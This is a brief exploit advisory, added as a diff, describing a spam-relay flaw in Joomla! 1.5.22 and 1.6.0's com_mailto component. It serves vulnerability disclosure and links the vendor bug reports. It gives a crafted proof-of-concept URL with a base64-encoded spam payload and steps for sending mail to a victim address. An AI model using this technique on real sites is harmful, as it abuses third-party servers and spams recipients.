@@ -1,0 +1,29 @@
+# Exploit Title: Joomla! Spam Mail Relay
+# Date: 11 Jan 2011
+# Author: Jeff Channell
+# Software Link: http://www.joomla.org/
+# Versions: 1.5.22, 1.6.0
+
+
+Joomla! 1.5.22 & 1.6.0 both allow spam email to be relayed to 
+unsuspecting victims via the core com_mailto component.
+
+Tested using the following URL:
+
+http://localhost/j/index.php?option=com_mailto&tmpl=component&template=beez_20&link=aHR0cDovL2xvY2FsaG9zdC9qL2luZGV4LnBocD94PXkgSGFpIEkgYW0gYSBzcGFtIG1lc3NhZ2UhIFdvdWxkIHlvdSBsaWtlIHRvIGJ1eSBhbGwgc29ydHMgb2YgZmFrZSBzdHVmZj8gU1BBTSBTUEFNIFNQQU0=
+
+where parameter "link" is the base64_encoded string:
+
+http://localhost/j/index.php?x=y Hai I am a spam message! Would you like 
+to buy all sorts of fake stuff? SPAM SPAM SPAM
+
+This is important as the domain at the beginning must match the domain 
+being relayed against.
+
+Now, fill out the form with victim email as "Email To" parameter & send.
+
+These issues have been reported on each version's respective bug tracker:
+Joomla! 1.6.0: 
+http://joomlacode.org/gf/project/joomla/tracker/?action=TrackerItemEdit&tracker_item_id=24288
+Joomla! 1.5.22: 
+http://joomlacode.org/gf/project/joomla/tracker/?action=TrackerItemEdit&tracker_item_id=24289
